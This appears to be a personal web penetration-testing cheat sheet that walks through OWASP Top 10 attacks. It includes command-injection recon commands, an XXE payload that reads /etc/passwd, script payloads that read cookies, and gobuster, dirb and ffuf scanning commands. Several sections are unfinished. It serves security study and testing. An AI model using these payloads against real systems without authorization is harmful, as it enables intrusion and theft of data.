# Intro

This is a cheat sheet for exploitation of OWASP Top 10.

It is the followed by more refined attacks. 

# OWASP Top 10

## Command Injection

If Backend has an insecure function that passes user input directly to shell, it can be exploited.

Try injecting the following:
```
# Linux

whoami
id
ifconfig/ip addr
uname -a
ps -ef


# Windows

whoami
ver
ipconfig
tasklist
netstat -an
```

For bypassing WAF and more advanced injections your best friend is as always: Payload all the thins.

## Broken Authentication

If an attacker is able to find flaws in an authentication mechanism, they would then successfully gain access to other users’ accounts.

1. Try manipulating session cookies to see if they are predictable
2. Manipulate GET requests containing IDs or usernames
3. Register as user with similar name: add space " admin" or numbers

## Sensitive Data Exposure

1. Search web source code
2. Dirbust for hidden files
3. Dork with Google or Github
4. Try downloading db files with command injection

## XXE injection

It arises from exploiting parsing of ENTITY element. It can be prevented by smart conding practices depending on language used: https://brightsec.com/blog/xxe-prevention/

For payloads refer to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-retrieve-files

1. Detect XXE
```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```
2. Exploit 
`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`

## Security Misconfigurations

* Accessible S3 Buckets
* Non functional additional features enabled: like status pages, accounts or privileges
* Default credentials
* Verbose error messages disclosing system properties
* Not using HTTP and cookies security headers
* Non patched systems

## XXS

1. Detect XXS

Alert() is dead: https://portswigger.net/research/alert-is-dead-long-live-print

Use print() instead or use only firefox browser for testing. But this would fail if user uses Chrome and its derivates.

Payloads: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

```
#get document cookies

<script>print(document.cookie)</script>

#get host ip
<script>print(window.location.host)</script>


```

## Insecure Deserialization

tbd properly

## Framework identification

* Wappalyzer
* Favicon
```
# grab the favicon like this 
user@machine$ curl https://ip.site.com/sites/favicon/images/favicon.ico | md5sum
```
Then find the framework on: https://wiki.owasp.org/index.php/OWASP_favicon_database

* Inspect Headers
`user@machine$ curl http://MACHINE_IP -v`

## Fuzzing

* https://github.com/ffuf/ffuf
* gobuster
* dibr

## My approach to Dirbusting

1. scan for common directories non recursively with gobuster first:
`gobuster dir -u http://ip -w /usr/share/seclists/Discovery/Web-Content/common.txt`

2. then scan recursively within found directories

`dirb http://ip /usr/share/seclists/Discovery/Web-Content/big.txt -X .html,.php,.cgi`

3. finally you can also fuzz the discovered content or anything else within head or requests

`ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://ip/FUZZ` (FUZZ keyword is there where you want to fuzz)


# Advanced Web Attacks

## API

## JWT